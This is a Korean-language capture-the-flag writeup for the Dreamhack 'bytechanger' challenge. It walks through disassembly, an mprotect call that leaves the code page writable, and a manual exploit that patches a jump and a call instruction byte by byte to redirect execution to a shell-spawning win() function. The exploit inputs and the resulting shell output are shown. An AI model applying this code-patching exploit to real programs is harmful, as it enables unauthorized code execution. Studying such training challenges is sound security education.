---
title: "[DREAMHACK] bytechanger writeup"
date: 2026-01-12 13:37:59
categories: Essay
tags: [writeup]
---
간단하게 작성할끼다.

# 보호기법
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

# 코드..
objdump로 간단하게 떴고, 다음은 주요 함수의 `dump`입니다.
```
00000000000011e9 <win>:
    11e9:	f3 0f 1e fa          	endbr64
    11ed:	55                   	push   rbp
    11ee:	48 89 e5             	mov    rbp,rsp
    11f1:	48 8d 05 0c 0e 00 00 	lea    rax,[rip+0xe0c]        # 2004 <_IO_stdin_used+0x4>
    11f8:	48 89 c7             	mov    rdi,rax
    11fb:	e8 b0 fe ff ff       	call   10b0 <system@plt>
    1200:	90                   	nop
    1201:	5d                   	pop    rbp
    1202:	c3                   	ret
...
0000000000001203 <main>:
    1203:	f3 0f 1e fa          	endbr64
    1207:	55                   	push   rbp
    1208:	48 89 e5             	mov    rbp,rsp
    120b:	48 83 ec 20          	sub    rsp,0x20
    120f:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1216:	00 00 
    1218:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    121c:	31 c0                	xor    eax,eax
    121e:	48 8b 05 0b 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e0b]        # 4030 <stdin@GLIBC_2.2.5>
    1225:	b9 00 00 00 00       	mov    ecx,0x0
    122a:	ba 02 00 00 00       	mov    edx,0x2
    122f:	be 00 00 00 00       	mov    esi,0x0
    1234:	48 89 c7             	mov    rdi,rax
    1237:	e8 94 fe ff ff       	call   10d0 <setvbuf@plt>
    123c:	48 8b 05 dd 2d 00 00 	mov    rax,QWORD PTR [rip+0x2ddd]        # 4020 <stdout@GLIBC_2.2.5>
    1243:	b9 00 00 00 00       	mov    ecx,0x0
    1248:	ba 02 00 00 00       	mov    edx,0x2
    124d:	be 00 00 00 00       	mov    esi,0x0
    1252:	48 89 c7             	mov    rdi,rax
    1255:	e8 76 fe ff ff       	call   10d0 <setvbuf@plt>
    125a:	48 8b 05 df 2d 00 00 	mov    rax,QWORD PTR [rip+0x2ddf]        # 4040 <stderr@GLIBC_2.2.5>
    1261:	b9 00 00 00 00       	mov    ecx,0x0
    1266:	ba 02 00 00 00       	mov    edx,0x2
    126b:	be 00 00 00 00       	mov    esi,0x0
    1270:	48 89 c7             	mov    rdi,rax
    1273:	e8 58 fe ff ff       	call   10d0 <setvbuf@plt>
    1278:	48 8d 05 84 ff ff ff 	lea    rax,[rip+0xffffffffffffff84]        # 1203 <main>
    127f:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
    1285:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
    1289:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
    128d:	ba 07 00 00 00       	mov    edx,0x7
    1292:	be 00 10 00 00       	mov    esi,0x1000
    1297:	48 89 c7             	mov    rdi,rax
    129a:	e8 41 fe ff ff       	call   10e0 <mprotect@plt>
    129f:	48 8d 05 66 0d 00 00 	lea    rax,[rip+0xd66]        # 200c <_IO_stdin_used+0xc>
    12a6:	48 89 c7             	mov    rdi,rax
    12a9:	b8 00 00 00 00       	mov    eax,0x0
    12ae:	e8 0d fe ff ff       	call   10c0 <printf@plt>
    12b3:	48 8d 45 e8          	lea    rax,[rbp-0x18]
    12b7:	48 89 c6             	mov    rsi,rax
    12ba:	48 8d 05 66 0d 00 00 	lea    rax,[rip+0xd66]        # 2027 <_IO_stdin_used+0x27>
    12c1:	48 89 c7             	mov    rdi,rax
    12c4:	b8 00 00 00 00       	mov    eax,0x0
    12c9:	e8 22 fe ff ff       	call   10f0 <__isoc99_scanf@plt>
    12ce:	48 8d 05 56 0d 00 00 	lea    rax,[rip+0xd56]        # 202b <_IO_stdin_used+0x2b>
    12d5:	48 89 c7             	mov    rdi,rax
    12d8:	b8 00 00 00 00       	mov    eax,0x0
    12dd:	e8 de fd ff ff       	call   10c0 <printf@plt>
    12e2:	48 8d 45 e7          	lea    rax,[rbp-0x19]
    12e6:	48 89 c6             	mov    rsi,rax
    12e9:	48 8d 05 4d 0d 00 00 	lea    rax,[rip+0xd4d]        # 203d <_IO_stdin_used+0x3d>
    12f0:	48 89 c7             	mov    rdi,rax
    12f3:	b8 00 00 00 00       	mov    eax,0x0
    12f8:	e8 f3 fd ff ff       	call   10f0 <__isoc99_scanf@plt>
    12fd:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
    1301:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
    1305:	48 01 d0             	add    rax,rdx
    1308:	48 89 c2             	mov    rdx,rax
    130b:	0f b6 45 e7          	movzx  eax,BYTE PTR [rbp-0x19]
    130f:	88 02                	mov    BYTE PTR [rdx],al
    1311:	b8 00 00 00 00       	mov    eax,0x0
    1316:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    131a:	64 48 2b 14 25 28 00 	sub    rdx,QWORD PTR fs:0x28
    1321:	00 00 
    1323:	74 05                	je     132a <main+0x127>
    1325:	e8 76 fd ff ff       	call   10a0 <__stack_chk_fail@plt>
    132a:	c9                   	leave
    132b:	c3                   	ret 
```

`win()` **함수에서 쉘을 얻을 수 있습니다.**
`main()` 함수에서 주요한 동작이 이루어집니다.

---
## `main()` 분석
`문자열`들 같은 경우는 `gdb`로 메모리 값을 직접 읽어 왔는데, 이번에는 `strings`를 써봤습니다.
```
...
change only 1 byte (idx): 
change to (val): 
%hhu
9*3$"
...
```

복잡한 프로그램이 아니라 얼핏 견주어 보면 어디에 쓰이는 문자열들인지 확인할 수 있습니다..

`rbp-0x10`을 기준으로 `0x1000`만큼 `읽기/쓰기/실행`이 가능한 영역을 확보해줍니다.
<!--more-->
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000      0 prob
    0x555555555000     0x555555556000 r-xp     1000   1000 prob
    0x555555556000     0x555555557000 r--p     1000   2000 prob
    0x555555557000     0x555555558000 r--p     1000   2000 prob
    0x555555558000     0x555555559000 rw-p     1000   3000 prob
    0x7ffff7c00000     0x7ffff7c24000 r--p    24000      0 /usr/lib/libc.so.6
    0x7ffff7c24000     0x7ffff7d95000 r-xp   171000  24000 /usr/lib/libc.so.6
    0x7ffff7d95000     0x7ffff7e04000 r--p    6f000 195000 /usr/lib/libc.so.6
    0x7ffff7e04000     0x7ffff7e08000 r--p     4000 203000 /usr/lib/libc.so.6
    0x7ffff7e08000     0x7ffff7e0a000 rw-p     2000 207000 /usr/lib/libc.so.6
    0x7ffff7e0a000     0x7ffff7e12000 rw-p     8000      0 [anon_7ffff7e0a]
    0x7ffff7f91000     0x7ffff7f96000 rw-p     5000      0 [anon_7ffff7f91]
    0x7ffff7fba000     0x7ffff7fbe000 r--p     4000      0 [vvar]
    0x7ffff7fbe000     0x7ffff7fc0000 r--p     2000      0 [vvar_vclock]
    0x7ffff7fc0000     0x7ffff7fc2000 r-xp     2000      0 [vdso]
    0x7ffff7fc2000     0x7ffff7fc3000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7fc3000     0x7ffff7fed000 r-xp    2a000   1000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7fed000     0x7ffff7ffb000 r--p     e000  2b000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  39000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  3b000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> p main
$1 = {<text variable, no debug info>} 0x555555555203 <main>
pwndbg> 
```

정상적으로, 원래 `PIE`영역에는 **읽기 및 실행**권한 만 주어집니다.
**하지만**,
```
   0x0000555555555278 <+117>:	lea    rax,[rip+0xffffffffffffff84]        # 0x555555555203 <main>
   0x000055555555527f <+124>:	and    rax,0xfffffffffffff000
   0x0000555555555285 <+130>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000555555555289 <+134>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000055555555528d <+138>:	mov    edx,0x7
   0x0000555555555292 <+143>:	mov    esi,0x1000
   0x0000555555555297 <+148>:	mov    rdi,rax
   0x000055555555529a <+151>:	call   0x5555555550e0 <mprotect@plt>
...
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/c65a61576b2aa3d08f9694349a48fd69d6609293d31c5edff9f77ab05fd3ea36.png)

위와 같이 mprotect()가 발생한 직후에는 **쓰기 권한**까지 부여된 모습을 확인 가능합니다.

# 익스플로잇 시나리오
분석해보셔서 아시겠지만, 이건 단지 `원하는 위치`에 `원하는 값`을 **임의로 쓸 수 있는** 바이너리입니다.
당연히 주소를 덮던가 하려면 여러 바이트를 써야하는데 말이죠..

예전에 들은건데, 인증 절차를 우회하려면 jmp문을 잘 쓰면 된다고 한 적이 있습니다.
`je` 명령어를 보다 그 기억이 떠올라서 그럼 어디로 이동해야할까, 고민했습니다.

아무리 생각해도 값을 덮으려면 `scanf`**가 있는 위치로 반복적으로 돌아가면서 값을 수정하는 것**이 최선으로 보였습니다.

이제 `scanf`가 있는 주소를 알아보겠습니다.

다시 `objdump`를 딴 부분으로 돌아가서,
```
    129f:	48 8d 05 66 0d 00 00 	lea    rax,[rip+0xd66]        # 200c <_IO_stdin_used+0xc>
    12a6:	48 89 c7             	mov    rdi,rax
    12a9:	b8 00 00 00 00       	mov    eax,0x0
    12ae:	e8 0d fe ff ff       	call   10c0 <printf@plt>
    12b3:	48 8d 45 e8          	lea    rax,[rbp-0x18]
    12b7:	48 89 c6             	mov    rsi,rax
    12ba:	48 8d 05 66 0d 00 00 	lea    rax,[rip+0xd66]        # 2027 <_IO_stdin_used+0x27>
    12c1:	48 89 c7             	mov    rdi,rax
    12c4:	b8 00 00 00 00       	mov    eax,0x0
    12c9:	e8 22 fe ff ff       	call   10f0 <__isoc99_scanf@plt>
```
첫 `scanf()`는 이쯤이네요. 자동화 익스플로잇을 작성하는 경우, `printf()`쪽으로 이동시키는 것이 좋습니다.
하지만 여기서는 수동으로 익스플로잇 하겠습니다.

따라서, `0x12b3`. 이 친구가 `scanf()`루프로 지정할 저희의 첫 타겟입니다.
아래, **스택 에필로그** 과정 근처에 다음과 같은 명령어들이 있습니다:
```
    1323:	74 05                	je     132a <main+0x127>
    1325:	e8 76 fd ff ff       	call   10a0 <__stack_chk_fail@plt>
    132a:	c9                   	leave
    132b:	c3                   	ret
```

`je`, `call`이 있는데, 이는 저희가 흐름을 바꾸는데 유용하게 사용할 수 있는 명령어들입니다.
`je`를 수정함으로써 저희는 **무한 반복을 구현할 수 있습니다.** 그리고 **원할 때 반복을 멈출 수 있습니다.**

`call`을 수정하면 반복이 끝난 후 **원하는 위치로 이동시킬 수 있습니다.**

각각의 `opcode` 는 16진수로 아래와 같습니다.

> `je`: `0x74`
`call`: `0xe8`

즉, `0x323+1`과 `0x325+1~4`를 수정하는 것이 저희가 익스플로잇 과정 중에 행하는 작업의 *전부*입니다.

명령어 삽입 방법은 아래에 첨부했습니다.
[명령어 레퍼런스](https://stackoverflow.com/questions/53395740/how-does-call-instruction-parsed-into-hex)

위 글에 따르면, `operand`에 그냥 주소만 주어지면 상대주소로 생각하여 명령을 수행하는 것으로 보입니다.
`je`, `call` 모두 **명령어가 위치한 주소** + **명령어의 크기**를 기반으로 `상대 주소의 기준점`이 정해지고, 그 상대주소에서 원하는 만큼 더하거나 빼어 주소를 사용하는 것 같습니다.

!! *질문글에는 정렬이 맞지 않다는 의견이 있었으나, 저같은 경우에는 그냥 오프셋 시작점을 기준으로 계산했더니 바로 됐습니다.*

# 3xpl017!
아래는 제가 새벽에 풀면서 정신 나갈듯이 작성했던 노트의 일부분입니다.
**4레벨을 쉽다고 생각하고 고난을..**
```
# 804 142 : je 명령어의 목적지를 scanf()로 바꿔야함. je명령어는 0x323(803)에 위치, 또한 je 23a에서 05는 je명령어 및 call에서 +0x5를 한 지점임.
# --> 그러므로 목적지인 804를 수정해야함. scanf()는 call명령어로부터 -만큼 떨어짐, 그러므로 0x2b3-0x325를 한 결과에 0xff를 마스킹하고 나온 0x8E가(142) je의 operand가 됨.
# 805: 수정할 필요 없음
# 아래 명령어의 크기는 상대 주소 계산 때문에 그럼 ㅇㅇ, 그냥 주소만 넣으면 자동 상대 주소 계산임
# 806~809:  현재는 0xfffffd76임. call 10a0에서의 0x10a0 = 0x1325 + 0x5(call 명령의 크기) + (0xfffffd76)을 의미함.
# --> win()의 위치는 11e9, 즉 call 11e9를 해야함.
# --> 역시나 (-)만큼 이동해야 함. 하지만 808, 809는 이미 0xff, 0xff이므로 806과 807만 바꿔주면 됨, 만에 하나 싶으면 806~809 하나하나 수정해줘도 됨 ㅇㅇ
# --> 즉, call 0x11e9을 수행하면 된다.
# ->> 0x132a - 0x11e9 = 0x141
# ->> 0x141만큼 뒤로 가야하므로 0xfffffebf가 됨.
# -321을 32-bit hex(4byte)로 바꿈 ㅇㅇ
```

`처음으로 컴퓨터 시스템 수업 때 배운 2진수 덧셈/뺄셈 및 16진수 변환` 이 쓸모 있었던 시간이었습니다...
앞으로 갈 길이 먼wwww

```
change only 1 byte (idx): 804
change to (val): 142
806
change to (val): 191
807
change to (val): 254
804
change to (val): 0
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn),100(users)
```

익스까지...